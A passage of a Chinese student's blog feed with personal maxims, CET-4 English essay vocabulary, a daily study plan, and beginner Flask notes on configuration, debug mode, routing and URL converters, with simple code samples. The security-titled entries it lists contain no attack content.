class="line">一、沉稳不要随便显露你的情绪。不要逢人就诉说你的困难和遭遇。在征询别人的意见之前，自己先思考，但不要先讲。不要一有机会就唠叨你的不满。重要的决定尽量与别人商量，最好隔一天再发布。讲话不要有任何的慌张，走路也是。细心对身边发生的事情，常思考它们的因果关系。对做不到位的执行问题，要发掘它们的根本症结。对习以为常的做事方法，要有改进或优化的建议。</span><br><span class="line">二、不要有权力的傲慢和知识的偏见。任何成果和成就都应和别人分享。必须有人牺牲或奉献的时候，自己走在前面。诚信做不到的事情不要说，说了就努力做到。虚的口号或标语不要常挂嘴上。</span><br><span class="line">三、不要因说错话而推卸责任，说了错话就要就应该在受到质疑时自觉承担、诚恳认错改正。说过了什么别人是会知道的，不要总是尝试着掩盖掉。不要总是把好像、大概、可能之类的话放在嘴边，特别是跟上级做交流汇报时。不要因为与对方亲密合拍而不注意礼节。切勿在恶语中伤他人，也要随便在背后说别人坏话，要管住自己的嘴。祸从口出，这句话是亘古不变的真理啊。不要去侵犯别人的隐私，突然间干涉谈论别人的私生活，否则别人会认为你太过八卦。</span><br><span class="line">稳重的性格不仅是一个人心理成熟的表现，更是为自己赢得成功的基础。稳重的性格是需要在生活中磨炼出来的，而并非是每个人天生就能拥有的。拥有稳重性格的人能做到遇事不慌乱，从容面对生活中出现的任何危机。</span><br></pre></td></tr></table></figure><p>每天一看，时刻提醒自己</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>英语作文</title>
      <link href="/2021/12/13/%E8%8B%B1%E8%AF%AD%E4%BD%9C%E6%96%87/"/>
      <url>/2021/12/13/%E8%8B%B1%E8%AF%AD%E4%BD%9C%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>希望四级可以过！！！保佑</p><span id="more"></span><h3 id="2021-6-2"><a href="#2021-6-2" class="headerlink" title="2021-6-2"></a>2021-6-2</h3><h4 id="题目：Do-violent-video-games-lead-to-violence"><a href="#题目：Do-violent-video-games-lead-to-violence" class="headerlink" title="题目：Do violent video games lead to violence?"></a>题目：Do violent video games lead to violence?</h4><p>这是一个议论文，要表达自己的观点</p><h5 id="单词"><a href="#单词" class="headerlink" title="单词"></a>单词</h5><table><thead><tr><th>单词</th><th align="left">句子</th></tr></thead><tbody><tr><td>popularization    普及，通俗化</td><td align="left">With the popularization of Internet and  smartphones,it is much easier for children today to get access to video games,many of which contain violent elements.</td></tr><tr><td>relieve   减轻，缓和     anxiety  焦虑      stress 压力   to some extent 在一定程度上 despite the fact that 尽管事实是</td><td align="left">Despite the fact that they help children to relieve  anxiety and stress,violent video will lead to children’s violent behavior to some extent.(despite不能与but连用)</td></tr><tr><td>mislead 误导     reasonable 合理的，有理由的  prone  有做坏事的倾向</td><td align="left">Firstly,violent elements in these video games will mislead children considering violence reasonable,thus making them more prone to solve problems violently.</td></tr><tr><td>frustration  挫折 temper 脾气 encouraging 导致 impulsive 浮躁，凭冲动行事的 reckless 鲁莽的，不计后果的</td><td align="left">Secondly，when they experience frequent failures in the games,the feeling of frustration might develop their bad temper,encouraging their impulsive and reckless.</td></tr><tr><td>In addition 此外 adolescence 青春期 perception 知觉感觉</td><td align="left"></td></tr><tr><td>As far as I can see 在我看来 mental health 心理健康     spiritual well-being 精神富足 establish 建立</td><td align="left">As far as I can see,parents and teachers should pay more attentions to children’s mental health and spiritual well-being,thus they can establish their own judgement.</td></tr><tr><td>increasingly  增长的</td><td align="left">The use of xxx is becoming increasingly popular.</td></tr><tr><td>rapid 快速的，迅速的   economic  经济的</td><td align="left">For the rapid economic development nowadays,these are more and more opportunities to do sth</td></tr><tr><td>notion  看法，观念，信念，理解</td><td align="left">notions about sth differ widely</td></tr></tbody></table><table><thead><tr><th>单词</th><th>句子</th></tr></thead><tbody><tr><td>process  过程，处理加工     operate 操作，运行    In addition   另外      complex  复杂的</td><td></td></tr><tr><td>moreover 而且 precise 准确地   accuracy  准确地   degrade  降低    severe   十分严重的</td><td></td></tr></tbody></table><h3 id="2020-9-3"><a href="#2020-9-3" class="headerlink" title="2020-9-3"></a>2020-9-3</h3><h4 id="题目：online-libraries"><a href="#题目：online-libraries" class="headerlink" title="题目：online libraries"></a>题目：online libraries</h4><table><thead><tr><th>单词</th><th>句子</th></tr></thead><tbody><tr><td></td><td>xxx are becoming more popular.It brings great benefits to people</td></tr><tr><td>inevitable   不可避免的   outweigh  大于，超过</td><td>As for me,the advantage of xxx outweigh the disadvantage</td></tr><tr><td>meanwhile   与此同时    region  地区，行政区 perspective  观点态度</td><td>from my perspective</td></tr><tr><td>boredom</td><td>无聊</td></tr><tr><td>trendy</td><td>时髦的</td></tr><tr><td>innovation</td><td>革新</td></tr><tr><td>tedious</td><td>乏味的</td></tr><tr><td>daydream</td><td>白日梦</td></tr><tr><td>valid</td><td>有效的</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>day12-13</title>
      <link href="/2021/12/13/day12-13/"/>
      <url>/2021/12/13/day12-13/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="今日计划"><a href="#今日计划" class="headerlink" title="今日计划"></a>今日计划</h1><ul><li>10:00-12:30 听1个半小时英语听力，背1小时单词</li><li>12：30-13:00 吃午饭</li><li>13:00-13:40 睡午觉</li><li>13:50-16:50 离散图论</li><li>17:00-18:50 汇编复习接口部分</li><li>19:10到校上课，计划写到21:30</li><li>21:30-22：30 ：背英语作文</li><li>10:50到宿舍</li><li>11:00-11:30 背翻译</li><li>11:30-12:00 复习今天的英语成果</li><li>12:30睡觉</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hash哈希拓展攻击</title>
      <link href="/2021/12/11/hash%E5%93%88%E5%B8%8C%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2021/12/11/hash%E5%93%88%E5%B8%8C%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>这个是sha1的加密原理，看错了…先保存着吧，会用上的</p><p><img src="C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20211211220306396.png" alt="image-20211211220306396"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架学习</title>
      <link href="/2021/12/09/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/09/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Flask本身相当于一个内核（根据内核的概念，我的理解是我们的代码相当于是软件，然后通过flask实施对硬件的管理，就是最后呈现出来的页面），几乎所有的所有的功能都需要用到扩展，都需要用第三方扩展来实现。</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="wsgi"><a href="#wsgi" class="headerlink" title="wsgi"></a>wsgi</h4><hr><p>Python Web Server Gateway Interface,它为python语言写的web服务器以及web应用程序或框架之间的一种简单而通用的接口。</p><p>wsgi分为两部分</p><ul><li>Server/GateWay：即Http Server，负责从客户端（Nginx，apache，iis）接受请求，将request转发给application，并将application返回的res返回到客户端</li><li>Application/Framework:一个python web应用或者是web框架，接收到server转发的request，处理请求，并将处理结果返回给server</li></ul><h3 id="可供学习的文档"><a href="#可供学习的文档" class="headerlink" title="可供学习的文档"></a>可供学习的文档</h3><ol><li>中文文档（<a href="http://docs.jinkan.org/docs/flask/%EF%BC%89">http://docs.jinkan.org/docs/flask/）</a></li><li>英文文档（<a href="http://flask.pocoo.org/docs/0.11/%EF%BC%89">http://flask.pocoo.org/docs/0.11/）</a></li><li>扩展列表：(<a href="http://flask.pocoo.org/extensions/%EF%BC%89">http://flask.pocoo.org/extensions/）</a></li></ol><h3 id="第一个web服务"><a href="#第一个web服务" class="headerlink" title="第一个web服务"></a>第一个web服务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Flask(Scaffold) Flask 对象实现了一个 WSGI 应用程序并充当中心对象。</span></span><br><span class="line"><span class="string">它传递了应用程序的模块或包的名称。一旦创建，它将充当视图功能、URL 规则、模板配置等的中央注册表。</span></span><br><span class="line"><span class="string">包的名称用于从包内部或模块所在的文件夹解析资源，</span></span><br><span class="line"><span class="string">具体取决于包参数是解析为实际的 python 包（包含 __init__.py 文件的文件夹）</span></span><br><span class="line"><span class="string">还是标准模块（只是一个 .py 文件）。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将路由映射到视图函数，index()</span></span><br><span class="line"><span class="comment">#我的理解是如果访问/,那么调用index()</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;HelloWorld&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Flask应用程序实例的run方法 启动web服务</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>按照上面的wsgi，是不是意思就是说，Http Server接受客户端的请求，路由是’/‘,然后转发request到web flask框架，然后flask通过路由映射到视图的函数即index(),返回‘Helloworld’给Http Sever，然后server转发给客户端</p><p>ah,我发现了一个warning:这不是wsgi服务器</p><p><img src="1.png" alt="image-20211209175508978"></p><h3 id="相关配置参数"><a href="#相关配置参数" class="headerlink" title="相关配置参数"></a>相关配置参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,</span></span></span><br><span class="line"><span class="function"><span class="params">             import_name: <span class="built_in">str</span>, <span class="comment">#flask程序所在的包，传__name__就可以得到，其可以决定flask访问静态文件时查找的路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">             static_url_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             static_folder: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;static&quot;</span>, <span class="comment">#静态文件存储的文件夹</span></span></span></span><br><span class="line"><span class="function"><span class="params">             static_host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             host_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             subdomain_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             template_folder: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;templates&quot;</span>,<span class="comment">#模板文件存储的文件夹</span></span></span></span><br><span class="line"><span class="function"><span class="params">             instance_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             instance_relative_config: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             root_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span>) -&gt; <span class="type">Any</span></span></span><br></pre></td></tr></table></figure><h3 id="加载配置文件"><a href="#加载配置文件" class="headerlink" title="加载配置文件"></a>加载配置文件</h3><p>在Flask程序运行的时候，可以给Flask设置相关配置（我理解的配置，就是说给这个东西添加它原来不具备的功能。比如，这个Flask框架就是一个很简单的只能在页面中输出helloworld的一个框架，我给他添加了一个可以连接数据库的配置，那么它就可以跟我的数据库相连接，在页面上实现对我的数据库的一个增删改查）</p><ul><li>从配置对象中加载（常用）<ul><li>app.config.from_object()</li></ul></li><li>从配置文件中加载<ul><li>app.config.from_pyfile()</li></ul></li><li>从环境变量中加载（不常用，我感觉我们的程序最终是让客户使用的，我们如果在让客户进行环境变量的配置，那会大大的减少客户的使用量）<ul><li>app.config.from_envvar()</li></ul></li></ul><h4 id="配置对象加载"><a href="#配置对象加载" class="headerlink" title="配置对象加载"></a>配置对象加载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一个配置对象,里面定义需要给app添加的一系列配置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    DEBUG=<span class="literal">True</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#从配置对象中加载配置</span></span><br><span class="line">app.config.from_object(Config)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    a=<span class="number">1</span>/<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;HelloWorld&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>​    关于<a href="https://blog.csdn.net/pick_ears/article/details/109234750">DEBUG</a>的使用</p><h4 id="从配置文件中加载配置"><a href="#从配置文件中加载配置" class="headerlink" title="从配置文件中加载配置"></a>从配置文件中加载配置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#从配置文件中加载配置</span></span><br><span class="line">app.config.from_pyfile(<span class="string">&#x27;config.ini&#x27;</span>)</span><br><span class="line"><span class="comment">#config.ini文件中的内容</span></span><br><span class="line">DEBUG=<span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="2.png" alt="image-20211209173704825"></p><p>从中可以看到DEBUG模块已经开启</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Flask应用将一些常用的配置设置成立应用程序对象的属性，也可以通过设置/获取某些配置</span></span><br><span class="line">app.debug=<span class="literal">True</span></span><br><span class="line"><span class="comment">#这样也可以成功</span></span><br></pre></td></tr></table></figure></blockquote><p><img src="3.png" alt="image-20211209175820363"></p><h4 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h4><ul><li>app.config.get()</li></ul><p><img src="4.png" alt="image-20211209175914630"></p><blockquote><p>发现了一个问题,我只打印了一次config.get（）,为什么出现了两次?</p><p>我尝试了下述的代码测试</p></blockquote><p><img src="5.png" alt="image-20211209181506114"></p><p>感觉应该是先从头到尾过一遍，然后遇到app.run（），然后，run是启动这个web程序，然后再从头到尾的来一遍</p><h3 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a>路由定义</h3><h4 id="指定路由地址"><a href="#指定路由地址" class="headerlink" title="指定路由地址"></a>指定路由地址</h4><p><img src="6.png" alt="image-20211209182156571"></p><p>仔细看这里有一个404，上次在做一道ctf文件上传题目的时候用到了包含长整形ip的时候，也是因为这个404，才没有包含成功</p><p>favicon.ico是页面的一个页面图标，这是浏览器的一个默认行为，当打开一个网页的时候，浏览器都会去请求页面图标，但是我这里没有，所以就会返回404</p><p><img src="7.png" alt="image-20211209182740968"></p><p><img src="8.png" alt="image-20211209182826940"></p><p>就前面的这个小图标</p><p>但是</p><p><img src="9.png" alt="image-20211209184549199"></p><p><img src="10.png" alt="image-20211209184602322"></p><p>就不会出现这种情况，具体原因是什么，我暂时不知道</p><p>感觉是浏览器对127.0.0.1以及其他ip的操作手段不一样</p><h4 id="给路由传递参数"><a href="#给路由传递参数" class="headerlink" title="给路由传递参数"></a>给路由传递参数</h4><p><img src="11.png" alt="image-20211210162419262"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#由路由传递参数</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello %s&#x27;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="comment">#路由传递的参数默认是 string 处理，也可以指定参数类型</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info1</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello %d&#x27;</span> % user_id</span><br></pre></td></tr></table></figure><h4 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h4><p>在Flask中第一一个路由，默认请求方式为：</p><ul><li>GET</li><li>OPTIONS(自带)</li><li>HEAD(自带)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods = [<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.method</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h4 id="正则匹配路由"><a href="#正则匹配路由" class="headerlink" title="正则匹配路由"></a>正则匹配路由</h4><p>在web开发中，可能会有限制用户访问规则的场景，那么这个时候就会用到正则匹配，根据自己的规则去限定请求参数进行访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegexConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,url_map,*args</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(RegexConverter,self).__init__(url_map)</span><br><span class="line">        <span class="comment">#args[0]接收的是我们定义的正则表达式</span></span><br><span class="line">        <span class="comment">#self.regex其实就是对BaseConvert中regex的重写</span></span><br><span class="line">        self.regex = args[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(self.regex)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        原生的args</span></span><br><span class="line"><span class="string">        args[0]:[^/]+</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#re()相当于RegexpConvert（），那么re(&quot;[0-9]&#123;6&#125;&quot;)相当于给RegexConverter的__init__传递了参数&quot;[0-9]&#123;6&#125;&quot;</span></span><br><span class="line">app.url_map.converters[<span class="string">&#x27;re&#x27;</span>] = RegexConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;re(&quot;[0-9]&#123;6&#125;&quot;):user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;用户的id是: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h5 id="to-python"><a href="#to-python" class="headerlink" title="to_python"></a>to_python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    regex= <span class="string">&#x27;(\\d+,?)+\\d$&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_python</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;here&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> value.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">app.url_map.converters[<span class="string">&quot;list&quot;</span>] = ListConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;list:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;用户的id是: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="12.png" alt="image-20211211203619629"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    regex= <span class="string">&#x27;(\\d+,?)+\\d$&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_python</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;to_python&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> value.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_url</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;to_url&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#app.url_map.converters[&#x27;re&#x27;] = RegexConverter</span></span><br><span class="line">app.url_map.converters[<span class="string">&quot;list&quot;</span>] = ListConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;list:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo2</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;用户的id是: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo3&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo3</span>():</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;demo2&#x27;</span>,user_id=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="13.png" alt="image-20211211205615504"></p><h3 id="简单视图"><a href="#简单视图" class="headerlink" title="简单视图"></a>简单视图</h3><p>在使用Flask给客户端返回JSON数据时，可以直接使用jsonify生成一个JSON响应</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js常见漏洞学习</title>
      <link href="/2021/11/30/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/30/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
